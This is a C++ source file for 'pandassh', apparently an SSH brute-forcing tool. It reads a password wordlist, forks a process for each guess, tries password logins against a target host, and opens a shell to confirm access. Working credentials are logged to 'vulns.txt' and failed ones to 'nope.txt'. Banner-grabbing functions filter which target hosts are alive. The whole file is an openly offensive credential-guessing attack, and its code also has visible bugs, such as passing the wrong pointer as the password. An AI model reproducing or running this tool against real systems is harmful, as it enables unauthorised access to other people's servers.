#include "../include/pandassh.h"



pandassh::pandassh(char* host, int port, bool useWordlist, char* username, char* password)
{
    //ssh_session tmpses = ssh_new();
    this->processes = 0;
    this->session = ssh_new();
    this->connection = false;
    this->SetPort(port);
    //this->SetMode(useWordlist);
    this->SetMode(useWordlist);
    this->SetHost(host);
    this->SetUsername(username);
    this->SetPassword(password);
    char* tmpWlPath = new char[255];
    strcpy(tmpWlPath,"wordlist.txt");
    this->SetWordlistPath(tmpWlPath);
    this->forks = 1;
    ssh_options_set(session,SSH_OPTIONS_USER,username);
    ssh_options_set(session,SSH_OPTIONS_PORT,&port);
    ssh_options_set(session,SSH_OPTIONS_HOST,host);

}

pandassh::~pandassh()
{
    //dtor
}

//bool pandassh::connect(int tries)
//{
//    // First we initiate
//    int verbosity = SSH_LOG_PROTOCOL;
//    int connectionSuccess = 0;
//    if(!tries)
//        tries = 1;
//    int i = 0;
//    bool success = false;
//
//    i++;
//
//    if(this->session == NULL)
//        success = false;
//
//
//
//    ssh_options_set(session, SSH_OPTIONS_HOST, host);
//    ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
//    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
//    connectionSuccess = ssh_connect(session);
//
//    if(connectionSuccess == SSH_OK)
//    {
//
//        if(this->VerifyHost(session) <= 0)
//        {
//
//            ssh_disconnect(session);
//            ssh_free(session);
//
//            success = false;
//        }
//        std::cout << "[SadPanda]:\t" << "Returning " << this->lastMsg;
//        //exit(0);
//        const char* pass = this->password;
//
//        connectionSuccess = ssh_userauth_password(session,NULL,pass);
//
//        if(connectionSuccess != SSH_AUTH_SUCCESS)
//        {
//
//            fprintf(stderr, "[SadPanda]:\tCould not authenticate with password: %s\n", ssh_get_error(session));
//            this->lastMsg = ssh_get_error(session);
//            ssh_disconnect(session);
//            ssh_free(session);
//            return false;
//        }
//
//        success = true;
//    }
//    else if(connectionSuccess == SSH_ERROR)
//    {
//        this->lastMsg = ssh_get_error(session);
//
//        success = false;
//    }
//
//
//    ssh_disconnect(session);
//    ssh_free(session);
//
//    if(success == true)
//    {
//        return true;
//    }
//    else
//        return false;
//}

int pandassh::CheckAuth(char* username, char* password, char* host)
{
    // We set these variables locally to let SSH populate them with the default options at first
    FILE *fh;
    this->processes++;
    alarm(10);

    int iSession = ssh_connect(session);

    // If we don't get a session, well that sucks
    if(iSession == SSH_ERROR)
        return -5;

    // And, if the password doesn't work ...
    if(ssh_userauth_password(session,NULL,password) != SSH_AUTH_SUCCESS)
    {
        ssh_disconnect(session);
        // Opening file handler for failed attempts...
        fh = fopen("nope.txt","a+");
        // Lets store failed attempts as well
        fprintf(fh,"[%s]: %s / %s",username,password,host);
        return 0;
    }

    // Lets write some information then - gotta know what works and what doesn't, amirite?

    if(shell())
    {
        // Lets open a file handler
        fh = fopen("vulns.txt","a+");
        // Lets save the vulnerability we found
        fprintf(fh,"[%s]: %s / %s",username,password,host);
        return 1;

    }
    // Close it!
    fclose(fh);
    return 0;
}

int pandassh::shell()
{
    // Set up a buffer and a timevalue struct
    ssh_buffer readBuffer = buffer_new();
    struct timeval timeValues;
    int poll = 0;
    int rc;

    // Declare our timevalues
    time_t start_time;
    time_t accumulator;

    // And, we need a channel of course
    ssh_channel channel;
    channel = ssh_channel_new(session);
    if(channel == NULL)
        return SSH_ERROR;
    // Lets poll for a channel!
    rc = ssh_channel_open_session(channel);
    // Check if we got a TTY!
    if(isatty(0))
    {
        poll = ssh_channel_request_pty(channel);
    }
    poll = ssh_channel_request_shell(channel);

    // ... and set the start time
    start_time = time(0);

    // Didn't we get a session? Free up and return
    if(rc != SSH_OK)
    {
        ssh_channel_free(channel);
        return rc;
    }

    while(poll != 0)
    {
        // Go sleep damnit
        usleep(500000);
        poll = channel_poll(channel,0);
        if(poll > 0)
        {
            poll = channel_read(channel, readBuffer, 0, 0);
        }
        else
        {
            if(start_time+5<time(0))
                return -1;
        }
    }
    return 0;

}



int pandassh::establishConnection()
{
    // We need a file handler for the wordlist, a buffer to read it, and a variable to store it in
    char buffer[1000], *s;
    FILE *fh;

    if(mode)
    {
        fh = fopen(wordlistPath,"r");
        if(fh == NULL)
        {
            lastMsg = "Couldn't open wordlist file. :(";
            return 0;
        }
        pid_t pid;
        pid = fork();
        //pids[processes] = pid;
        std::stringstream ss;
        std::string tmpWlPath;
        std::string tmpPid;
        ss << wordlistPath;
        ss >> tmpWlPath;
        ss << pid;
        ss >> tmpPid;
        lastMsg = "Started process ... File " + tmpWlPath + " PID: "+tmpPid;
        if(pid < 0)
        {
            lastMsg = "Error: fork()";
            return -1;
        }
        if(pid == 0)
        {
            while(fgets(buffer, 1000, fh))
            {
                s = strchr(buffer, '\n');
                pid_t cpid = fork();
                if(!cpid)
                {
                    password = buffer;
                    if(int rt = CheckAuth(username,s,host))
                        return rt;
                    else return 0;
                }
                else
                {
                    pids[processes] = cpid;
                    processes++;
                    if(processes > forks)
                        for(processes;processes > forks; processes--)
                        {
                            kill(pids[processes],SIGTERM);
                        }
                    wait();
                }
            }
            tmpPid = "";
            pid_t getPid = getpid();
            ss << getPid;
            ss >> tmpPid;
            lastMsg = "Complete - File = "+ tmpWlPath +", PID = "+tmpPid;
        }
    }
    else
    {
        pid_t pid;
        pid = fork();
        std::stringstream ss;
        std::string tmpPid;

        ss << pid;
        ss >> tmpPid;
        lastMsg = "Started process ... PID: "+tmpPid;
        if(pid < 0)
        {
            lastMsg = "Error: fork()";
            return -1;
        }
        if(pid == 0)
        {
            pid_t cpid = fork();
            if(!cpid)
            {
                if(int rt = CheckAuth(username,password,host))
                    return rt;
                else return 0;
            }
            else
            {
                pids[processes] = cpid;
                processes++;
                if(processes > forks)
                    for(processes;processes > forks; processes--)
                    {
                        kill(pids[processes],SIGTERM);
                    }
                wait();
            }

            tmpPid = "";
            pid_t getPid = getpid();
            ss << getPid;
            ss >> tmpPid;
            return 1;
        }
    }
    return -2;

   /* This should go in main.cpp, to try IPs before connecting to them.
    if(strcmp(argv[1], "-grab") == 0) // If the user wants -grab...
    {
        char buffer[200], data[] = "\r\n\r\n\r\n"; // The data to send.
        int len = strlen(data); // The data's length.
        int sock; // Our unix socket.
        struct sockaddr_in remote; // Declare a sockaddr_in structure (remote).

        remote.sin_family = AF_INET; // Sock family is AF_INET.
        remote.sin_port = htons(22); // Port is 22.
        remote.sin_addr.s_addr = inet_addr(argv[2]); // The ip to connect to.

        if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) // If no socket!?
        {
            printf("Error: socket()\n"); // Print this.
            return -1;
        }
        if(connect(sock,(struct sockaddr *)&remote, sizeof(struct sockaddr)) < 0) // If we can't connect!?
        {
            printf("Error: connect()\n"); // Print this.
            return -1;
        }
        send(sock, data, len, 0); // Send the data.
        memset(buffer, 0, sizeof(buffer)); // Clear the buffer.
        read(sock, buffer, sizeof(buffer)); // Read the buffer.
        printf("\nSSHd Banner: %s\n", buffer); // Print this and the buffer.
        close(sock); // Close our socket.
        return 0;
    }
    */

}

bool pandassh::filterAlive(commands* arguments)
{
        int i=0;
        int forks=(int)arguments->hosts.size();
        int processes = 0;
        int pids[forks];
        int removed = 0;

        printf("\nHere we go ... time to filter.");
        pid_t pid;
        pid = fork();
        if(pid < 0)
        {
            printf("Error: fork()");
            return false;
        }
        if(pid == 0)
        {
            printf("\nPid is 0, gonna loop some kk? Starting at %s, and ending at %s",*arguments->hosts.begin(),*arguments->hosts.end());
            arguments->y = arguments->hosts.begin();
            for(arguments->y; arguments->y != arguments->hosts.end(); arguments->y++)
            {
                //pid_t cpid = fork();
                printf("\nI have just forked to connect to %s, pid is now %s",*arguments->y,getpid());
                /*if(!cpid)
                {
                    if(int rt = pandassh::attemptConnect(*arguments->y,arguments->port))
                    {
                        if(rt < 1)
                        {
                            arguments->hosts.remove(*arguments->y);
                            printf("\nI have removed a host.");
                            wait();
                        }
                        else
                            printf("\nGuess fucking what, I got false from attemptConnect..");
                    }

                }
                else
                {
                    pids[processes] = cpid;
                    processes++;
                    if(processes > forks)
                        for(processes;processes > forks; processes--)
                        {
                            kill(pids[processes],SIGTERM);
                        }
                    wait();
                }*/
            }
            printf("\nOut of the loop!");
            pid_t getPid = getpid();
        }
        else
        {
            printf("\nGiving up, I did not fork because pid is %s",getpid());
        }


        usleep(500);

    if(arguments->hosts.empty())
        return false;
    else
        return true;
}

int pandassh::attemptConnect(char* host,int port)
{
        // Set up a remote sockaddr_in struct
        struct sockaddr_in remote;
        // Set up a buffer, and a variable containing the data to send some data
        char buffer[255];
        char data[] = "\r\n\r\n\r\n";
        int nSocket;
        int dataLength = strlen(data);
        std::cout << "3";
        remote.sin_family = AF_INET;
        remote.sin_port = htons(port);
        remote.sin_addr.s_addr = inet_addr(host);
        std::cout << "4";
        // Check if we can get a socket

        if((nSocket = socket(AF_INET, SOCK_STREAM, 0))< 0)
        {
            printf("[SadPanda]: Socket error for %s\n",host);
            std::cout << "4.5";
            return 0;
        }

        // ... then check if we can connect
        if(connect(nSocket,(struct sockaddr *)&remote, sizeof(struct sockaddr))<= 0)
        {
            printf("[SadPanda]: Could not connect to %s\n",host);
            return -1;
        }

        send(nSocket,data,dataLength,0);

        // Clear buffer from memory
        memset(buffer,0,sizeof(buffer));

        // Read buffer
        read(nSocket,buffer,sizeof(buffer));
        printf("\n[HappyPanda]: I has found bannerz? %s",buffer);
        close(nSocket);
        return 1;
}



bool pandassh::execute(std::string command)
{
    return true;
}
